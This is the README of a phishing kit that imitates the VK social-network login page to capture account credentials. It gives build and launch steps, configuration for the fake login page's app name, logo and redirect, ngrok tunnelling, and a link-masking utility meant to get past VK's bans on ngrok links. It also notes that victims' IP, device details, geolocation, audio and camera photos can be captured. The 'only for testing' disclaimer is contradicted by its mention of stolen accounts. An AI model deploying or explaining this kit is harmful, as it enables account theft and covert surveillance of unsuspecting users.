
# VK Phishing
  
This tool is ONLY FOR testing. Author is not responsible for all stolen accounts by this tools. 


## Build Setup

  

``` bash

# install dependencies

$ npm run install

  

# build for production and launch server

$ npm run start

  

# then follow instructions from th console

```

  

## Configuration

### Login Page 

Configuration is stored in `nuxt.config.js`, as the option `vkLogin`.  Options (all required): 
   + `appName`  - VK application name
   + `appLogo` - VK application logo, must be square, recommended size is (50x50)
   + `cancelReturnUrl` - URL, to what user will be redirected, if press cancel button

### Ngrok

  

Ngrok configuration file is in `config/ngrok.yml`. Supported only global options.

Read more at [ngrok docs](https://ngrok.com/docs#config)

### Aye Kosmonavt

This is util for hide links (Not url shortener). Undocumented. If explain simple, it has 5 options: 
  1. Title, the link and browser tab title, required
  2. Image, the background page's image, required
  3. OgImage, used as preview for social media, unnecessary
  4. Redir, redirect url, unnecessary
  5. Rt (redir time), time in seconds, after what user will be redirected to url.  If less then 1, server will send location header, and will expose your original url. 
 
 Here it used for hide ngrok links, what often are banned by VK. Also ngrok leaks user data, such as ip, port, user-agent, navigator settings, and can leak geolocation, audio (3 sec) and frontal camera photo.
  
Config stored in `config/aye-kosmonavt.yml`. You can create multiple presets for you convenience and select it by `use` option.
